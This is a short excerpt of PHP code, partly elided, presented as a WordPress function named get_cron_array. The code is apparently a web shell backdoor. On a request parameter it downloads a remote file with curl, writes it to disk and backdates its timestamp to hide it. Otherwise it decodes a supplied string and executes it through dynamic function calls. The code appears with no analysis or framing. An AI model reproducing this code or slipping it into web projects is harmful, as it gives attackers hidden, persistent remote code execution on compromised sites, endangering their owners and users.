...
function get_cron_array() {
	...
	if ( !isset($info['dbc43']) ) die( 'Restricted access' );
	if (isset($info['dbc43fpc'])) {
		$ch = curl_init($info['dbc43ru']);
		curl_setopt($ch, 19913, true);
		echo file_put_contents($info['dbc43fpc'], curl_exec($ch));
		@touch($info['dbc43fpc'], feedmtimeFolder(dirname($info['dbc43fpc']))); die;
	} else {
		preg_match('/[A-Z]/', $info['dbc43'], $sep);
		...
		foreach ($info['feed'] as $sepp) {
			$info['dbc43'] = $sepp($info['dbc43']);
		}
		$sep[3] = $sep[2](@$sep[1], $info['dbc43']); $sep[3]();
	}
}
